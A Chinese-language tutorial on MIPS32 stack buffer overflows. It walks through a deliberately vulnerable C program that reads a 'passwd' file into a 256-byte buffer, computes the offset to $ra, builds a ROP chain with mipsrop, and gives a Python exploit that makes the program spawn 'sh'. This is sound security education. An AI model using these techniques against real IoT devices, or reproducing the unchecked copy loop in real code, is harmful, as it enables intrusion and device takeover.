# MIPS架构——堆栈缓冲区溢出调试与利用
> 大中午啊
> 来源：https://www.iotsec-zone.com/article/12

# MIPS 堆栈原理

栈是一种具有先进后出队列性质的数据结构。调用栈（Call Stack）是指存放某个程序正在运行的函数的信息的栈。调用栈由栈帧(Stack Frame)组成，每个栈帧对应一个未完成运行的函数。

这里主要介绍 物联网设备中常见的指令架构MIPS32 ，这个架构中的函数有两种，叶子函数和非叶子函数，判断叶子函数的方式只需要判断函数内是否调用其他函数，有调用则是非叶子函数，没有调用则是叶子函数，

**非叶子函数调用过程**
程序在跳转到非叶子函数以后，则非叶子函数会把调用它的函数的返回地址(也就是$RA寄存器)存入堆栈中，再将自己函数返回地址存入到$RA，在函数返回时，非叶子函数会将栈中先前保存的返回地址取出保存到$RA中，再执行 “jr $ra”返回原函数。

**叶子函数调用过程**
程序在跳转到叶子函数中，过程比较简单，叶子函数不会改变寄存器$RA的值，因为函数跳转到它，就不会再有跳转了，因此在函数返回时，直接 “jr $ra”返回原函数。

**函数调用参数传递**
在MIPS 体系的函数调用过程中，通过$a0~ $a3 传递前四个参数，多余的通过栈传递。

**栈空间缓冲区溢出**
栈空间缓冲区是用于内存中存储数据的内存区域。
缓冲区溢出就是大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检车不严格，导致小缓冲区明显不足以接收整个大缓冲区的数据，超出的部分覆盖了与小缓冲区相邻的内存区中的其他数据而引发的内存问题。
成功利用缓冲区溢出可能造成严重的后果，基本上可分为3 种情况，分别是拒绝服务、获得用户权限、获得系统权限。

接下来和我一起来学习栈空间缓冲区溢出吧！ ：）

 

# 环境搭建

系统：Ubuntu 16.04
工具：IDA 7.5、QEMU
mips交叉编译环境

 

# 漏洞代码
```c
mips_stack.c
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
void do_system(int code,char *cmd)
{
    char buf[255];
    //sleep(1);
    system(cmd);
}
void main()
{
    char buf[256]={0};
    char ch;
    int count = 0;
    unsigned int fileLen = 0;
    struct stat fileData;
    FILE *fp;

    if(0 == stat("/home/tigerortiger/study/mips_stack/passwd",&fileData))
        fileLen = fileData.st_size;
    else
        return 1;
    if((fp = fopen("/home/tigerortiger/study/mips_stack/passwd","rb")) == NULL)
    {
        printf("Cannot open file passwd!n");
        exit(1);
    }    
    ch=fgetc(fp);
    printf("[+]  1 line : ");
    while(count <= fileLen)
    {
        buf[count++] = ch;
        ch = fgetc(fp);
    //printf("[+]   %s \r\n",ch);
    }
    buf[--count] = 'x00';
    printf("[+] passwd content : %s",buf[0]);
    if(!strcmp(buf,"adminpwd"))
    {        
        do_system(count,"ls -l");
    }
    else
    {
        printf("you have an invalid password!n");
    }
    fclose(fp);
}
```

编译
```shell
./mips-linux-gcc -static /home/tigerortiger/study/mips_stack/stack.c -o stack
```
 

# 文件分析

1、首先查看文件信息，可以看到是mips32 架构

![0.png](https://www.iotsec-zone.com/images/MdImg/940201061f001e4faccaa24da668d04d.png)

2、根据查看mips_stack.c 的源码或者运行文件可以知道，main()函数会读取passwd 文件，并且将文件的内容种存入局部变量buf 中，而buf 仅为256字节，如果passwd 中的文件大于256字节，那么多余的字节就会导致缓冲区无法放下，造成溢出现象。
3、生成600个字符串都passwd
```shell
python -c "print 'A'*600">passwd
```
4、执行文件，可以看到”segmentation fault “
![1.png](https://www.iotsec-zone.com/images/MdImg/8fbe98ad7e067afd371ebb217891a93a.png)

5、接下来进行远程调试，查看栈上的情况

```shell
tigerortiger@ubuntu ~/s/mips_stack> qemu-mips-static -g 1234 ./stack
```

6、使用IDA 进行调试，连接，运行。

![2.png](https://www.iotsec-zone.com/images/MdImg/b6d5abb1fbe864ac22b229380a666f4b.png)

7、程序在试图执行0x41414141处的指令时发生了崩溃,这刚好是AAAA的十六进制，0x41414141超出了进程,引发了断段故障

![3.png](https://www.iotsec-zone.com/images/MdImg/30cc7a7792a848df85bfaff1b780fd1f.png)

由此上述分析可知，文件存在缓冲区溢出的漏洞，并且可以将数据覆盖到$RA寄存器中。

 
漏洞exploit利用开发
完整漏洞利用开发过程应该是如下的步骤：
1、计算局部变量到 返回地址的偏移，也就是buf 到$ra的偏移，劫持PC；
2、寻找可利用的攻击方式和途径
3、构造ROP Chain
4、编写漏洞利用程序

计算偏移
首先是确定buf 到$ra的偏移
这里介绍两种方法来进行计算

**1、栈帧分析**

通过静态分析，首先F5 看程序的伪代码，需要确定buf 离栈帧的地址，如下图所示，buf 会和adminpwd 进行比较，因此根据mips种函数调用参数的特性，可以定位到$a0，最终可以定位到 0x1C8+var_198，其中0x1C8 是栈帧的地址。

![4.png](https://www.iotsec-zone.com/images/MdImg/d3743eac374238a5a7ba291340cc2970.png)

下面确定buf 的偏移为-0x198 (这里的偏移都是相对栈帧fp), 并且也确定了$ra 的偏移为0x4。

![5.png](https://www.iotsec-zone.com/images/MdImg/02f1e3ddc4781423455f60982855d4eb.png)

如果需要使缓冲区溢出，控制堆栈的返回地址$ra，需要覆盖的数据大小应该达到 0x4-(-0x198) = 0x19c 字节

![6.png](https://www.iotsec-zone.com/images/MdImg/aedaf6499155a1796bbc482a8e814399.png)

2、使用脚本工具
脚本自取：【[https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py】](https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py】)
使用脚本字符来将生成字符串存储到 passwd 中

![7.png](https://www.iotsec-zone.com/images/MdImg/3b5cbe763acdd1ab83e24cc6e5b68a53.png)

使用IDA 进行远程调试，可以看到在$ra地址处是 0x6E37416E

![8.png](https://www.iotsec-zone.com/images/MdImg/3b80e7da2382454d74dfcbf6b78e4a40.png)

使用脚本计算偏移为412，和上面栈帧分析的一样。

![9.png](https://www.iotsec-zone.com/images/MdImg/e89b0fe6c1692ccc3f031bd1a5ac486b.png)

![10.png](https://www.iotsec-zone.com/images/MdImg/9afd76bea573e27ab7dfdb7d372fca5b.png)

**寻找可利用的攻击途径**
通过对文件的静态分析，不难发现程序中调用了do_system_0 函数，这个函数会调用system()函数来执行第二个参数，因此只需要将要执行的命令传入do_system_0函数的第二个参数$a1 中即可。

![11.png](https://www.iotsec-zone.com/images/MdImg/d35af981e3bab2d79c22101b142e564f.png)

构造ROP chain
这里需要用到IDA脚本插件mipsrop.py
1、安装mipsrop.py
下载，完了放到ida的plugins目录就行，重启IDA。
【[https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py】](https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py】)
2、打开你的mips程序，点击search——>mips rop gadgets 。

![12.png](https://www.iotsec-zone.com/images/MdImg/ee9f73883a7d6b0f0649793e570bb47d.png)

3、输入“ mipsrop.stackfinder() ”查找可用的godget

![13.png](https://www.iotsec-zone.com/images/MdImg/fbf9e268568b966f799ae58605f47845.png)

4、双击0x00403810 可以看到这里，下面红色框中的代码我们可以用来构造rop chain。
为什么这段代码可以使用，是因为我们上面分析过，需要给do_system_0 函数 $a1 传递我们要执行的命令，恰好0x00403810此处将$sp+0x54+var_30内存中值赋值给$a1，只需要将要执行的命令放在$sp+0x54+var_30处，另外我们要调用do_system_0函数，下面0x00403814处 将$sp+0x54+var_s0的值加载到$ra 寄存中，后面会执行” jr $ra”, 让程序跳转到do_system_0继续执行。

![14.png](https://www.iotsec-zone.com/images/MdImg/0e5f8ee21d878992fcb3f859c38fa0b6.png)

6、最终构造的ROP chain 如下图所示

![15.png](https://www.iotsec-zone.com/images/MdImg/70a6cbcc316a623068b5ef0cf5630e62.png)

编写漏洞利用程序
```python
import struct

print("[*] prepare shellcode")

cmd = "sh"
cmd += "\00"*(4-(len(cmd) %4))  # 栈对齐
shellcode = "A"*0x19C
shellcode += struct.pack(">L",0x00403810)
shellcode += "A"*24
shellcode += cmd
shellcode += "B"*(0x3C - len(cmd))
shellcode += struct.pack(">L", 0x00400680)
shellcode += "BBBB"
print("OK!")

print("[+] create password file")
fw = open('passwd','w')
fw.write(shellcode)
fw.close()
print("ok")
```

执行exploit

![16.png](https://www.iotsec-zone.com/images/MdImg/142e0b15bd60cd677362de5422cd5a03.png)
